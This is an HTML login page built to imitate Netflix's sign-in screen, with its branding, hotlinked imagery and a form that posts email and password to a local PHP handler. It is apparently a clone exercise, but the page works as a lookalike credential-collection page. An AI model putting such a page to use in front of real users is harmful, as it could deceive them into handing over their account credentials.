<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
   

    <style>
        body {
            background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bcae-07a3f8dc141a/f6d7434e-d6de-4185-a6d4-c77a2d08737b/US-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg');
            background-size: cover;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background-color: rgba(0, 0, 0, 0.75);
            padding: 60px 68px 40px;
            width: 450px;
            border-radius: 4px;
            color: white;
        }
        h1 { margin-bottom: 28px; font-size: 32px; }
        input {
            width: 100%;
            padding: 16px;
            margin-bottom: 16px;
            background: #333;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 16px;
            background-color: #e50914;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 24px;
        }
        .toggle-text {
            margin-top: 16px;
            color: #737373;
            font-size: 13px;
        }
        .toggle-text a { color: white; text-decoration: none; cursor: pointer; }
        .error { color: #e87c03; font-size: 13px; display: none; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1 id="title">Sign In</h1>
        <div id="error-msg" class="error">Invalid email or password.</div>
        
        <form id="auth-form" action="api/login_process.php" method="POST">
            <input type="hidden" name="action" id="action" value="login">
            <input type="email" name="email" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" id="submit-btn">Sign In</button>
        </form>

        <div class="toggle-text">
            <span id="question">New to Netflix?</span> 
            <a onclick="toggleMode()">Sign up now.</a>
        </div>
    </div>
    <script>
        // Switch between Login and Signup modes
        function toggleMode() {
            const title = document.getElementById('title');
            const btn = document.getElementById('submit-btn');
            const question = document.getElementById('question');
            const action = document.getElementById('action');
            
            if (title.innerText === 'Sign In') {
                title.innerText = 'Sign Up';
                btn.innerText = 'Sign Up';
                question.innerText = 'Already have an account?';
                action.value = 'signup';
            } else {
                title.innerText = 'Sign In';
                btn.innerText = 'Sign In';
                question.innerText = 'New to Netflix?';
                action.value = 'login';
            }
        }
    </script>
</body>
</html>